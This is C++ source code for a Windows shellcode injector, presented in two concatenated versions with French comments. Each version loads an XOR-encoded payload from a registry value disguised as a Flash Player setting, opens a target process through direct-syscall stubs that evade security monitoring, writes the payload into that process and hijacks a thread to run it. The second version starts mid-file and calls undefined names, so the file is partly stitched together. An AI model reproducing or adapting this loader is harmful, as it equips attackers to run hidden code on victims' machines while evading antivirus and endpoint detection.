#include <Windows.h>
#include <TlHelp32.h>
#include <winreg.h>
#include <cstdio>
#include <cstdlib>
#include "syscalls.h"

#pragma comment(lib, "Advapi32.lib")

// --- Chaînes obfusquées (XOR 0x5D) ------------------------------------------
// "Software\\Macromedia\\FlashPlayer"
static const unsigned char s_path[] = {
    0x0E,0x32,0x3B,0x29,0x2A,0x3C,0x2F,0x38,0x01,0x01,
    0x10,0x3C,0x3E,0x2F,0x32,0x30,0x38,0x39,0x34,0x3C,
    0x01,0x01,0x1B,0x31,0x3C,0x2E,0x35,0x0D,0x31,0x3C,
    0x24,0x38,0x2F, 0x00
};
// "Config"
static const unsigned char s_val[] = {
    0x1E,0x32,0x33,0x3B,0x34,0x3A, 0x00
};
#define STR_MASK   0x5D
#define BLOB_MASK  0x6B

static void UnmaskStr(const unsigned char* src, char* dst) {
    while (*src) *dst++ = (char)(*src++ ^ STR_MASK);
    *dst = '\0';
}

static DWORD LocateTargetThread(DWORD pid) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    THREADENTRY32 te;
    ZeroMemory(&te, sizeof(te));
    te.dwSize = sizeof(te);

    DWORD found = 0;
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) { found = te.th32ThreadID; break; }
            te.dwSize = sizeof(te);
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    return found;
}

static unsigned char* FetchBlob(SIZE_T* outLen) {
    *outLen = 0;

    char keyPath[64] = {0};
    char keyVal[16]  = {0};
    UnmaskStr(s_path, keyPath);
    UnmaskStr(s_val,  keyVal);

    HKEY hk = NULL;
    LSTATUS ls = RegOpenKeyExA(HKEY_CURRENT_USER, keyPath, 0, KEY_READ, &hk);
    if (ls != ERROR_SUCCESS) return NULL;

    DWORD sz = 0;
    ls = RegQueryValueExA(hk, keyVal, NULL, NULL, NULL, &sz);
    if (ls != ERROR_SUCCESS || sz == 0) { RegCloseKey(hk); return NULL; }

    unsigned char* buf = (unsigned char*)malloc(sz);
    if (!buf) { RegCloseKey(hk); return NULL; }

    ls = RegQueryValueExA(hk, keyVal, NULL, NULL, buf, &sz);
    RegCloseKey(hk);
    if (ls != ERROR_SUCCESS) { SecureZeroMemory(buf, sz); free(buf); return NULL; }

    for (DWORD i = 0; i < sz; ++i) buf[i] ^= BLOB_MASK;
    *outLen = sz;
    return buf;
}

int main(int argc, char* argv[]) {
    if (argc < 2) { printf("Usage: %s <PID>\n", argv[0]); return 1; }
    DWORD pid = (DWORD)atoi(argv[1]);

    SIZE_T blobLen = 0;
    unsigned char* blob = FetchBlob(&blobLen);
    if (!blob || blobLen == 0) {
        if (blob) free(blob);
        return 1;
    }

    HANDLE hProc = NULL;
    HANDLE hThr  = NULL;
    PVOID  rBuf  = NULL;
    SIZE_T written = 0;
    ULONG  oldProt = 0, suspCount = 0;
    SIZE_T region = blobLen;

    CLIENT_ID cid;
    ZeroMemory(&cid, sizeof(cid));
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);

    NTSTATUS st = Qn3_NtOpenProcess(
        &hProc,
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        &oa, &cid);
    if (st != 0 || !hProc) goto cleanup;

    DWORD tid = LocateTargetThread(pid);
    if (tid == 0) goto cleanup;
    cid.UniqueThread = (HANDLE)(ULONG_PTR)tid;

    st = Qn3_NtOpenThread(
        &hThr,
        THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
        &oa, &cid);
    if (st != 0 || !hThr) goto cleanup;

    st = Qn3_NtAllocateVirtualMemory(
        hProc, &rBuf, 0, &region,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (st != 0 || !rBuf) goto cleanup;

    st = Qn3_NtWriteVirtualMemory(hProc, rBuf, blob, blobLen, &written);
    if (st != 0) goto cleanup;

    // La payload est écrite, on peut nettoyer le buffer local tout de suite.
    SecureZeroMemory(blob, blobLen);
    free(blob);
    blob = NULL;

    st = Qn3_NtProtectVirtualMemory(
        hProc, &rBuf, &region, PAGE_EXECUTE_READ, &oldProt);
    if (st != 0) goto cleanup;

    st = Qn3_NtSuspendThread(hThr, &suspCount);
    if (st != 0) goto cleanup;

    {
        CONTEXT ctx;
        ZeroMemory(&ctx, sizeof(ctx));
        ctx.ContextFlags = CONTEXT_FULL;

        st = Qn3_NtGetContextThread(hThr, &ctx);
        if (st != 0) { Qn3_NtResumeThread(hThr, NULL); goto cleanup; }

        ctx.Rip = (DWORD64)rBuf;

        st = Qn3_NtSetContextThread(hThr, &ctx);
        if (st != 0) { Qn3_NtResumeThread(hThr, NULL); goto cleanup; }

        Qn3_NtResumeThread(hThr, NULL);
    }

cleanup:
    if (blob) { SecureZeroMemory(blob, blobLen); free(blob); blob = NULL; }
    if (hThr)  Qn3_NtClose(hThr);
    if (hProc) Qn3_NtClose(hProc);
    return 0;
}static unsigned char* LoadPayloadFromRegistry(SIZE_T* outSize) {
	*outSize = 0;

	HKEY hKey = NULL;
	LSTATUS ls = RegOpenKeyExA(HKEY_CURRENT_USER, REG_KEY, 0, KEY_READ, &hKey);
	if (ls != ERROR_SUCCESS) {
		printf("[-] RegOpenKeyExA failed: %ld\n", ls);
		return NULL;
	}

	DWORD size = 0;
	ls = RegQueryValueExA(hKey, REG_VALUE, NULL, NULL, NULL, &size);
	if (ls != ERROR_SUCCESS || size == 0) {
		printf("[-] RegQueryValueExA (size) failed: %ld\n", ls);
		RegCloseKey(hKey);
		return NULL;
	}

	unsigned char* buf = (unsigned char*)malloc(size);
	if (!buf) {
		RegCloseKey(hKey);
		return NULL;
	}

	ls = RegQueryValueExA(hKey, REG_VALUE, NULL, NULL, buf, &size);
	RegCloseKey(hKey);

	if (ls != ERROR_SUCCESS) {
		printf("[-] RegQueryValueExA (data) failed: %ld\n", ls);
		SecureZeroMemory(buf, size);
		free(buf);
		return NULL;
	}

	// XOR decode en place
	for (DWORD i = 0; i < size; i++) buf[i] ^= XOR_KEY;

	printf("[+] Payload lue depuis HKCU\\%s\\%s (%lu octets)\n", REG_KEY, REG_VALUE, size);

	*outSize = size;
	return buf;
}

int main(int argc, char* argv[]) {
	if (argc < 2) {
		printf("Usage: %s <PID>\n", argv[0]);
		return 1;
	}

	DWORD pid = (DWORD)atoi(argv[1]);

	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	PVOID rBuffer = NULL;
	SIZE_T bytesWritten = 0;
	ULONG oldProtect = 0;
	ULONG suspendCount = 0;

	SIZE_T payload_size = 0;
	unsigned char* buf = LoadPayloadFromRegistry(&payload_size);
	if (!buf || payload_size == 0) return 1;

	SIZE_T regionSize = payload_size;

	CLIENT_ID cid = { 0 };
	cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;

	OBJECT_ATTRIBUTES oa;
	InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);

	NTSTATUS status = Sw3NtOpenProcess(
		&hProcess,
		PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
		&oa,
		&cid);

	if (status != 0 || hProcess == NULL) {
		printf("[-] NtOpenProcess failed: 0x%08lX\n", status);
		SecureZeroMemory(buf, payload_size);
		free(buf);
		return 1;
	}
	printf("[+] Handle to PID %lu: %p\n", pid, hProcess);

	DWORD tid = FindThreadInProcess(pid);
	if (tid == 0) {
		printf("[-] No thread found in target process\n");
		Sw3NtClose(hProcess);
		SecureZeroMemory(buf, payload_size);
		free(buf);
		return 1;
	}
	printf("[+] Target thread TID: %lu\n", tid);

	cid.UniqueThread = (HANDLE)(ULONG_PTR)tid;

	status = Sw3NtOpenThread(
		&hThread,
		THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
		&oa,
		&cid);

	if (status != 0 || hThread == NULL) {
		printf("[-] NtOpenThread failed: 0x%08lX\n", status);
		Sw3NtClose(hProcess);
		SecureZeroMemory(buf, payload_size);
		free(buf);
		return 1;
	}
	printf("[+] Thread handle: %p\n", hThread);

	status = Sw3NtAllocateVirtualMemory(
		hProcess,
		&rBuffer,
		0,
		&regionSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE);

	if (status != 0 || rBuffer == NULL) {
		printf("[-] NtAllocateVirtualMemory failed: 0x%08lX\n", status);
		Sw3NtClose(hThread);
		Sw3NtClose(hProcess);
		SecureZeroMemory(buf, payload_size);
		free(buf);
		return 1;
	}
	printf("[+] Allocated %zu bytes at %p (RW)\n", payload_size, rBuffer);

	status = Sw3NtWriteVirtualMemory(
		hProcess,
		rBuffer,
		buf,
		payload_size,
		&bytesWritten);

	SecureZeroMemory(buf, payload_size);
	free(buf);
	buf = NULL;

	if (status != 0) {
		printf("[-] NtWriteVirtualMemory failed: 0x%08lX\n", status);
		Sw3NtClose(hThread);
		Sw3NtClose(hProcess);
		return 1;
	}
	printf("[+] Wrote %zu bytes\n", bytesWritten);

	status = Sw3NtProtectVirtualMemory(
		hProcess,
		&rBuffer,
		&regionSize,
		PAGE_EXECUTE_READ,
		&oldProtect);

	if (status != 0) {
		printf("[-] NtProtectVirtualMemory failed: 0x%08lX\n", status);
		Sw3NtClose(hThread);
		Sw3NtClose(hProcess);
		return 1;
	}
	printf("[+] Memory protection changed to RX\n");

	status = Sw3NtSuspendThread(hThread, &suspendCount);
	if (status != 0) {
		printf("[-] NtSuspendThread failed: 0x%08lX\n", status);
		Sw3NtClose(hThread);
		Sw3NtClose(hProcess);
		return 1;
	}
	printf("[+] Thread suspended (previous count: %lu)\n", suspendCount);

	CONTEXT ctx;
	memset(&ctx, 0, sizeof(ctx));
	ctx.ContextFlags = CONTEXT_FULL;

	status = Sw3NtGetContextThread(hThread, &ctx);
	if (status != 0) {
		printf("[-] NtGetContextThread failed: 0x%08lX\n", status);
		Sw3NtResumeThread(hThread, NULL);
		Sw3NtClose(hThread);
		Sw3NtClose(hProcess);
		return 1;
	}
	printf("[+] Original RIP: 0x%p\n", (PVOID)ctx.Rip);

	ctx.Rip = (DWORD64)rBuffer;

	status = Sw3NtSetContextThread(hThread, &ctx);
	if (status != 0) {
		printf("[-] NtSetContextThread failed: 0x%08lX\n", status);
		Sw3NtResumeThread(hThread, NULL);
		Sw3NtClose(hThread);
		Sw3NtClose(hProcess);
		return 1;
	}
	printf("[+] RIP redirected to 0x%p\n", rBuffer);

	status = Sw3NtResumeThread(hThread, NULL);
	if (status != 0) {
		printf("[-] NtResumeThread failed: 0x%08lX\n", status);
	}

	printf("[+] Thread resumed. Shellcode executing.\n");

	Sw3NtClose(hThread);
	Sw3NtClose(hProcess);

	return 0;
}
